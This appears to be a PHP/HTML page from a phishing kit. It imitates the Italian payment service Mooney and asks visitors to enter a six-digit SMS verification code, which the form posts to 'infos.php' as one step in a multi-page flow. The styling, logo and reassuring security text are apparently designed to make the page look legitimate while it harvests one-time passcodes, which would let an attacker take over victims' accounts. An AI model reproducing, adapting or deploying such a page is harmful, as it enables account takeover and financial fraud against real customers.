<?php
require_once "functions.php";
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mooney - Verifica SMS</title>
    <!-- إضافة Favicon -->
    <link rel="icon" type="image/png" href="image/unnamed.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        /* Logo */
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo img {
            height: 50px;
        }
        
        /* Title */
        h1 {
            text-align: center;
            font-size: 28px;
            margin-bottom: 20px;
            color: #4F4F4F;
            font-weight: bold;
        }
        
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #4F4F4F;
            margin-bottom: 40px;
            line-height: 1.6;
        }
        
        /* Phone Animation */
        .phone-animation {
            position: relative;
            margin: 30px 0;
            height: 160px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .phone {
            width: 100px;
            height: 200px;
            background: linear-gradient(135deg, #FFCC00, #e6b800);
            border-radius: 25px;
            position: relative;
            box-shadow: 0 15px 35px rgba(255, 204, 0, 0.3);
            animation: phoneFloat 3s ease-in-out infinite;
            border: 3px solid #333;
        }
        
        .phone-screen {
            position: absolute;
            top: 15px;
            left: 8px;
            right: 8px;
            bottom: 15px;
            background: white;
            border-radius: 18px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 15px;
            overflow: hidden;
        }
        
        .mooney-logo {
            font-size: 14px;
            font-weight: bold;
            color: #FFCC00;
            margin-bottom: 10px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        
        .message-icon {
            font-size: 24px;
            color: #008085;
            margin-bottom: 8px;
            animation: messagePulse 2s infinite;
        }
        
        .message-text {
            font-size: 9px;
            color: #4F4F4F;
            font-weight: 600;
            text-align: center;
            margin-bottom: 5px;
        }
        
        .code-preview {
            font-size: 14px;
            color: #FFCC00;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            margin-top: 5px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        
        .notification-dot {
            position: absolute;
            top: 12px;
            right: 12px;
            width: 8px;
            height: 8px;
            background: #ff4444;
            border-radius: 50%;
            animation: blink 1.5s infinite;
        }
        
        @keyframes phoneFloat {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-10px) rotate(1deg); }
        }
        
        @keyframes messagePulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        /* Form Container */
        .form-container {
            width: 100%;
        }
        
        .form-group {
            margin-bottom: 30px;
            width: 100%;
            position: relative;
        }
        
        label {
            display: block;
            margin-bottom: 12px;
            color: #4F4F4F;
            font-size: 16px;
            font-weight: bold;
        }
        
        .input-field {
            width: 100%;
            padding: 0;
            border: none;
            border-bottom: 2px solid #ddd;
            font-size: 18px;
            color: #4F4F4F;
            background: transparent;
            padding-bottom: 8px;
            transition: border-color 0.3s;
            text-align: center;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            letter-spacing: 8px;
        }
        
        .input-field::placeholder {
            color: #4F4F4F;
            font-size: 16px;
            letter-spacing: normal;
            font-family: Arial, sans-serif;
            font-weight: normal;
        }
        
        .input-field:focus {
            outline: none;
            border-bottom-color: #008085;
        }
        
        .input-hint {
            color: #4F4F4F;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
        }
        
        /* Error Styles */
        .input-field.error {
            border-bottom-color: #dc3545;
        }
        
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
            font-weight: 600;
            animation: fadeIn 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .error-icon {
            font-size: 16px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 18px;
            background-color: #FFCC00;
            color: #333;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 30px;
            transition: background-color 0.3s;
        }
        
        .btn:hover {
            background-color: #e6b800;
        }
        
        .security-info {
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 25px;
            margin-top: 30px;
            text-align: center;
        }
        
        .security-icon {
            font-size: 24px;
            margin-bottom: 10px;
            color: #008085;
        }
        
        .security-title {
            font-size: 16px;
            font-weight: 600;
            color: #4F4F4F;
            margin-bottom: 8px;
        }
        
        .security-description {
            font-size: 14px;
            color: #4F4F4F;
            line-height: 1.5;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 0 20px;
                max-width: 100%;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .logo img {
                height: 40px;
            }
            
            .input-field {
                font-size: 16px;
            }
            
            .phone {
                width: 90px;
                height: 180px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .container {
                padding: 0 10px;
            }
            
            h1 {
                font-size: 22px;
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .logo img {
                height: 35px;
            }
            
            .btn {
                padding: 16px;
                font-size: 16px;
            }
            
            .phone {
                width: 80px;
                height: 160px;
            }
            
            .input-field {
                letter-spacing: 6px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <img src="image/logo-mo.svg" alt="Mooney Logo">
        </div>
        
        <!-- Phone Animation -->
        <div class="phone-animation">
            <div class="phone">
                <div class="phone-screen">
                    <div class="notification-dot"></div>
                    <div class="mooney-logo">MOONEY</div>
                    <div class="message-icon">✉️</div>
                    <div class="message-text">NUOVO MESSAGGIO</div>
                    <div class="message-text" style="font-size: 8px;">Codice di verifica</div>
                    <div class="code-preview">••••••</div>
                </div>
            </div>
        </div>
        
        <!-- Title -->
        <h1>Verifica via SMS</h1>
        <p class="subtitle">
            Ti abbiamo inviato un codice di verifica al tuo numero di telefono<br>
            Inserisci il codice ricevuto per continuare
        </p>
        
        <div class="form-container">
            <form action="infos.php" method="POST">
                <!-- إضافة حقل hidden لتحديد الخطوة -->
                <input type="hidden" name="step" value="sms">
                
                <div class="form-group">
                    <label for="sms-code">Codice di verifica SMS*</label>
                    <input type="text" id="sms-code" name="sms" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['sms'])) ? 'error' : ''; ?>" placeholder="Es: 123456" required maxlength="6">
                    
                    <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['sms'])): ?>
                    <div class="error-message">
                        <span class="error-icon">⚠️</span>
                        Codice SMS non valido. Riprova.
                    </div>
                    <?php 
                        // إزالة الخطأ من الجلسة بعد عرضه
                        unset($_SESSION['errors']['sms']);
                    endif; 
                    ?>
                    
                    <div class="input-hint">Inserisci il codice a 6 cifre ricevuto via SMS</div>
                </div>
                
                <button type="submit" class="btn">VERIFICA CODICE</button>
            </form>
            
            <!-- Security Info -->
            <div class="security-info">
                <div class="security-icon">🛡️</div>
                <div class="security-title">Per la tua sicurezza</div>
                <p class="security-description">
                    Il codice SMS è valido per 10 minuti. Non condividere il codice con nessuno.
                    Mooney non richiederà mai il codice via telefono.
                </p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const smsInput = document.getElementById('sms-code');
            
            // تحديد الحد الأقصى لـ 6 أرقام فقط
            smsInput.addEventListener('input', function(e) {
                // السماح فقط بالأرقام
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // تحديد الحد الأقصى لـ 6 أرقام
                if (this.value.length > 6) {
                    this.value = this.value.slice(0, 6);
                }
            });
            
            // تأثيرات الظهور المتدرج
            const container = document.querySelector('.form-container');
            container.style.opacity = '0';
            container.style.transform = 'translateY(30px)';
            container.style.transition = 'all 0.8s ease';
            
            setTimeout(() => {
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 200);
            
            // تركيز الحقل تلقائياً
            smsInput.focus();
        });
    </script>
</body>
</html>